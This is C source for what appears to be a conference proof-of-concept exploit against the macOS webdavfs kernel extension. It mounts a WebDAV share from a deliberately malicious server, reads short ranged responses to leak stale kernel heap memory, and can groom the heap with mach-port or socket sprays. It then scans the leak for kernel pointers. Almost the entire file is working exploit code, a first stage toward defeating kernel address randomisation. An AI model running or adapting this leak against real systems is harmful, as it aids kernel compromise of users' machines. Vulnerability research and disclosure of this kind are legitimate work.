/*
 * leak.c -- stage-0 leak primitive for the webdavfs stale-heap info-leak
 * (Black Hat USA 2026, Blazakis/Calif; macOS 26.4.1 / 25E253).
 *
 * Flow:
 *   1. mount a WebDAV share served by server/webdav_server.py, which answers
 *      ranged GETs with a well-formed but SHORT 206 body, then closes;
 *   2. open /poc.bin and pread() --size bytes at a non-zero --offset;
 *   3. webdav_read_bytes() in the kext copies request_read.count bytes from
 *      an unzeroed kalloc_large(MAX_READ) buffer into our uio even though
 *      soreceive() returned short -> the shortfall is stale kernel heap;
 *   4. scan the buffer for non-zero / kernel-pointer-looking qwords.
 *
 * Spray modes:
 *   --spray ports : queue OOL-ports mach messages (kalloc_large arrays of
 *                   identical ipc_port pointers), free them, then leak and
 *                   count how many copies of the marker pointer came back.
 *   --spray inpcb : open many ICMPv6 raw sockets before the leak.
 *   --spray none  : plain leak.
 *
 * This is an information-leak PoC only: no kernel R/W, no post-exploitation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <limits.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "spray.h"

#define TARGET_FILE      "poc.bin"
#define DEFAULT_MOUNT    "/tmp/lpe-webdav-mnt"
#define DEFAULT_SERVER   "http://127.0.0.1:8080"
#define DEFAULT_SIZE     (4 * 1024 * 1024)
#define DEFAULT_OFFSET   4096
#define DEFAULT_COUNT    512
#define DEFAULT_DESCS    16383        /* 16383 * 8 = 131064 -> kalloc_large */
#define BODY_QWORD       0x4141414141414141ULL  /* 'A' * 8 from the server  */
#define MAX_HEXDUMP      48

enum spray_mode { SPRAY_NONE, SPRAY_PORTS, SPRAY_INPCB };

static const char *opt_server = DEFAULT_SERVER;
static char        opt_mount[PATH_MAX] = DEFAULT_MOUNT;
static size_t      opt_size   = DEFAULT_SIZE;
static off_t       opt_offset = DEFAULT_OFFSET;
static int         opt_count  = DEFAULT_COUNT;
static uint32_t    opt_descs  = DEFAULT_DESCS;
static enum spray_mode opt_spray = SPRAY_NONE;

static void
usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s [--server URL] [--mount DIR] [--size N] [--offset N]\n"
        "          [--spray ports|inpcb|none] [--count N] [--descs N]\n"
        "\n"
        "  --server   WebDAV URL of the malicious server (default %s)\n"
        "  --mount    mountpoint directory (default %s)\n"
        "  --size     pread size in bytes; K/M suffix ok (default %d)\n"
        "  --offset   pread offset, MUST be non-zero (default %d)\n"
        "  --spray    heap grooming before the leak (default none)\n"
        "  --count    spray units: mach messages or sockets (default %d)\n"
        "  --descs    OOL port descriptors per message (default %d)\n",
        prog, DEFAULT_SERVER, DEFAULT_MOUNT, DEFAULT_SIZE, DEFAULT_OFFSET,
        DEFAULT_COUNT, DEFAULT_DESCS);
}

static size_t
parse_size(const char *s)
{
    char *end = NULL;
    unsigned long long v = strtoull(s, &end, 0);
    if (end) {
        switch (*end) {
        case 'k': case 'K': v *= 1024ULL; break;
        case 'm': case 'M': v *= 1024ULL * 1024ULL; break;
        case 'g': case 'G': v *= 1024ULL * 1024ULL * 1024ULL; break;
        default: break;
        }
    }
    return (size_t)v;
}

/* Run cmd synchronously; return its exit status. */
static int
run_cmd(const char *path, char *const argv[])
{
    pid_t pid = fork();
    int status;

    if (pid < 0)
        return -1;
    if (pid == 0) {
        execv(path, argv);
        _exit(127);
    }
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR)
            return -1;
    }
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return -1;
}

static void
do_unmount(void)
{
    char *umount_argv[] = { "umount", opt_mount, NULL };
    char *diskutil_argv[] = { "diskutil", "unmount", "force", opt_mount, NULL };

    if (run_cmd("/sbin/umount", umount_argv) != 0)
        run_cmd("/usr/bin/diskutil", diskutil_argv);
}

static int
do_mount(void)
{
    char *argv[] = { "mount_webdav", "-s", (char *)opt_server, opt_mount,
                     NULL };
    char path[PATH_MAX];
    struct stat st;
    int i, rc;

    if (mkdir(opt_mount, 0755) < 0 && errno != EEXIST) {
        fprintf(stderr, "[leak] mkdir %s: %s\n", opt_mount, strerror(errno));
        return -1;
    }

    /* best-effort cleanup of a stale mount from a previous run */
    do_unmount();

    fprintf(stderr, "[leak] mounting %s on %s\n", opt_server, opt_mount);
    rc = run_cmd("/sbin/mount_webdav", argv);
    if (rc != 0) {
        fprintf(stderr, "[leak] mount_webdav exited with status %d\n", rc);
        return -1;
    }

    /* wait until the target file resolvable through the mount */
    snprintf(path, sizeof(path), "%s/%s", opt_mount, TARGET_FILE);
    for (i = 0; i < 100; i++) {
        if (stat(path, &st) == 0) {
            fprintf(stderr, "[leak] %s visible, size=%lld\n", path,
                    (long long)st.st_size);
            return 0;
        }
        usleep(100 * 1000);
    }
    fprintf(stderr, "[leak] %s never appeared after mount\n", path);
    return -1;
}

/* ------------------------------------------------------------------ */
/* leak-buffer scanning                                               */
/* ------------------------------------------------------------------ */

static int
qword_cmp(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static int
looks_kernel_ptr(uint64_t v)
{
    /* Apple arm64 kernel data pointers: top byte 0xff (0xffffffe...).
     * Exclude all-zero / all-ones and our own filler. */
    if (v == 0 || v == UINT64_MAX || v == BODY_QWORD)
        return 0;
    return (v >> 56) == 0xff;
}

static void
scan_buffer(const uint8_t *buf, size_t len)
{
    size_t nq = len / 8, i, nk = 0;
    uint64_t nonzero = 0, body = 0, kptr = 0, tagged = 0;
    uint64_t *kvals;
    int dumped = 0;

    kvals = malloc(nq * sizeof(uint64_t));
    if (kvals == NULL) {
        fprintf(stderr, "[scan] malloc failed\n");
        return;
    }

    for (i = 0; i < nq; i++) {
        uint64_t v;
        memcpy(&v, buf + i * 8, sizeof(v));
        if (v == 0)
            continue;
        nonzero++;
        if (v == BODY_QWORD) {
            body++;
            continue;
        }
        if (looks_kernel_ptr(v)) {
            kptr++;
            kvals[nk++] = v;
        } else if ((v >> 56) != 0) {
            tagged++;   /* high tag bits but not 0xff: PAC-tagged-ish */
        }
    }

    printf("[scan] bytes=%zu qwords=%zu\n", len, nq);
    printf("[scan] non-zero qwords              : %llu\n",
           (unsigned long long)nonzero);
    printf("[scan] server-body qwords (0x41...) : %llu\n",
           (unsigned long long)body);
    printf("[scan] kernel-ptr-looking (ff<<56)  : %llu\n",
           (unsigned long long)kptr);
    printf("[scan] other high-tag qwords        : %llu\n",
           (unsigned long long)tagged);

    if (nk > 0) {
        size_t j, best_len = 0, best_start = 0;

        qsort(kvals, nk, sizeof(uint64_t), qword_cmp);
        for (i = 0; i < nk; i = j) {
            for (j = i + 1; j < nk && kvals[j] == kvals[i]; j++)
                ;
            if (j - i > best_len) {
                best_len = j - i;
                best_start = i;
            }
        }
        printf("[scan] modal kernel-ptr value 0x%016llx seen %zu times",
               (unsigned long long)kvals[best_start], best_len);
        if (opt_spray == SPRAY_PORTS)
            printf("  <-- recovered sprayed port-pointer copies");
        printf("\n");

        /* histogram of the top few repeated values */
        printf("[scan] top repeated kernel-ptr values:\n");
        {
            int shown = 0;
            for (i = 0; i < nk && shown < 10; ) {
                size_t j;
                for (j = i + 1; j < nk && kvals[j] == kvals[i]; j++)
                    ;
                if (j - i >= 2) {
                    printf("        0x%016llx  x%zu\n",
                           (unsigned long long)kvals[i], j - i);
                    shown++;
                }
                i = j;
            }
        }
    }

    /* hexdump of the first candidate regions containing kernel-ptr qwords */
    printf("[scan] candidate hexdump (first %d rows with kernel-ptr qwords):\n",
           MAX_HEXDUMP);
    for (i = 0; i + 8 <= len && dumped < MAX_HEXDUMP; i += 8) {
        uint64_t v;
        memcpy(&v, buf + i, sizeof(v));
        if (!looks_kernel_ptr(v))
            continue;
        printf("  +0x%08zx: %02x %02x %02x %02x %02x %02x %02x %02x"
               "   0x%016llx\n",
               i, buf[i], buf[i+1], buf[i+2], buf[i+3],
               buf[i+4], buf[i+5], buf[i+6], buf[i+7],
               (unsigned long long)v);
        dumped++;
    }
    free(kvals);
}

/* ------------------------------------------------------------------ */

int
main(int argc, char **argv)
{
    static const struct option long_opts[] = {
        { "server", required_argument, NULL, 's' },
        { "mount",  required_argument, NULL, 'm' },
        { "size",   required_argument, NULL, 'z' },
        { "offset", required_argument, NULL, 'o' },
        { "spray",  required_argument, NULL, 'p' },
        { "count",  required_argument, NULL, 'c' },
        { "descs",  required_argument, NULL, 'd' },
        { "help",   no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 }
    };
    int ch, fd = -1, rc = 1;
    uint8_t *buf = NULL;
    ssize_t got;
    char path[PATH_MAX];
    port_spray_t *pspray = NULL;
    inpcb_spray_t *ispray = NULL;

    while ((ch = getopt_long(argc, argv, "s:m:z:o:p:c:d:h", long_opts,
                             NULL)) != -1) {
        switch (ch) {
        case 's': opt_server = optarg; break;
        case 'm':
            snprintf(opt_mount, sizeof(opt_mount), "%s", optarg);
            break;
        case 'z': opt_size = parse_size(optarg); break;
        case 'o': opt_offset = (off_t)parse_size(optarg); break;
        case 'p':
            if (strcmp(optarg, "ports") == 0)
                opt_spray = SPRAY_PORTS;
            else if (strcmp(optarg, "inpcb") == 0)
                opt_spray = SPRAY_INPCB;
            else if (strcmp(optarg, "none") == 0)
                opt_spray = SPRAY_NONE;
            else {
                fprintf(stderr, "[leak] unknown spray mode '%s'\n", optarg);
                return 2;
            }
            break;
        case 'c': opt_count = atoi(optarg); break;
        case 'd': opt_descs = (uint32_t)strtoul(optarg, NULL, 0); break;
        case 'h':
        default:
            usage(argv[0]);
            return ch == 'h' ? 0 : 2;
        }
    }

    if (opt_offset == 0) {
        fprintf(stderr, "[leak] offset must be non-zero "
                "(webdav_read_bytes rejects offset==0 reads)\n");
        return 2;
    }
    if (opt_size == 0) {
        fprintf(stderr, "[leak] size must be non-zero\n");
        return 2;
    }

    if (do_mount() != 0)
        return 1;

    snprintf(path, sizeof(path), "%s/%s", opt_mount, TARGET_FILE);
    fd = open(path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[leak] open %s: %s\n", path, strerror(errno));
        goto out;
    }

    buf = malloc(opt_size);
    if (buf == NULL) {
        fprintf(stderr, "[leak] malloc(%zu): %s\n", opt_size,
                strerror(errno));
        goto out;
    }
    memset(buf, 0, opt_size);

    /* warm-up read to make the vnode's page-in path reachable */
    {
        char tmp[4096];
        (void)pread(fd, tmp, sizeof(tmp), opt_offset);
    }

    switch (opt_spray) {
    case SPRAY_PORTS:
        pspray = ool_ports_spray_start((uint32_t)opt_count, opt_descs);
        if (pspray == NULL)
            goto out;
        ool_ports_spray_destroy(pspray);   /* free kalloc_large arrays */
        pspray = NULL;
        fprintf(stderr, "[leak] spray freed; leaking immediately\n");
        break;
    case SPRAY_INPCB:
        ispray = inpcb_spray_start(opt_count);
        break;
    case SPRAY_NONE:
        break;
    }

    fprintf(stderr, "[leak] pread(%zu bytes @ %lld)\n", opt_size,
            (long long)opt_offset);
    got = pread(fd, buf, opt_size, opt_offset);
    if (got < 0) {
        fprintf(stderr, "[leak] pread: %s\n", strerror(errno));
        goto out;
    }
    fprintf(stderr, "[leak] pread returned %zd bytes\n", got);

    scan_buffer(buf, (size_t)got);
    rc = 0;

out:
    if (ispray != NULL)
        inpcb_spray_destroy(ispray);
    free(buf);
    if (fd >= 0)
        close(fd);
    fprintf(stderr, "[leak] unmounting %s\n", opt_mount);
    do_unmount();
    rmdir(opt_mount);
    return rc;
}
